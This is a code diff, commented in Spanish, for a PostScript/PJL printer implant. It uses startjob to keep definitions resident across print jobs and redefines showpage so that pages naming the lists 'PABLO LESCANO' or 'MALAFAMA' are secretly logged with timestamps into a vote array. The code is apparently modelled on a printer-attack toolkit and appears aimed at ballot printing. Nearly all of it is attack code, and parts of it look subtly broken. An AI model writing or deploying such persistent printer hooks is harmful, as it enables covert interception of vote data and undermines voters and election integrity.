@@ -1,31 +1,47 @@
+%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT
+%!
+
+% Sacar la fecha actual
+/ahoramesmo {
+  (%Calendar%) /IODevice resourcestatus
+  { (%Calendar%) currentdevparams /DateTime get }
+  { (Not available) } ifelse
+} def
+
+% El trucazo para poder definir cosas en userdict y que queden entre impresiones
+true 0 startjob pop
+
+
 % Al redefinir `showpage` hay que poner un valor magico para triggerear las acciones
 /lista1 (PABLO LESCANO) def
 /lista2 (MALAFAMA) def
-/mandalemecha true def % Para que la hoja de impresion de votos sepa que la impresora esta hackeada
 
 /cantvotos 400 def
 /currvoto 0 def % Las mesas no tienen mas de 400 votantes en general
 /votos cantvotos array def
 
 /pushvoto {
-  a 0 3 -1 roll % acomodo el stack
+  votos 0 3 -1 roll % acomodo el stack
   put % sumo el voto
   /currvoto currvoto 1 add cantvotos mod def % incremento el voto actual
 } def
 
 /sumarvoto {
-  3 array % creo el voto
   % Tiene que tomar la fecha y hora, la lista y agregarla al array de votos
+  dup [ exch ahoramesmo ] % creo el voto
   pushvoto % lo agrego a la lista
 } def
 
 
 % Podría agregarse algo así a showpage
 % se tiene que construir un ataque similar al de https://github.com/RUB-NDS/PRET
-count 0 gt { % Si hay algo en el stack
-  dup        % Lo duplico por las dudas
-  lista1 eq { sumarvoto } if % Si es la lista uno sumo el voto
-  dup
-  lista2 eq { sumarvoto } if % Si es la lista dos sumo el voto
-}
+/showpage {
+  count 0 gt { % Si hay algo en el stack
+    dup        % Lo duplico por las dudas
+    lista1 eq { sumarvoto } if % Si es la lista uno sumo el voto
+    dup
+    lista2 eq { sumarvoto } if % Si es la lista dos sumo el voto
+  }
+  systemdict /showpage get exec
+} def
 
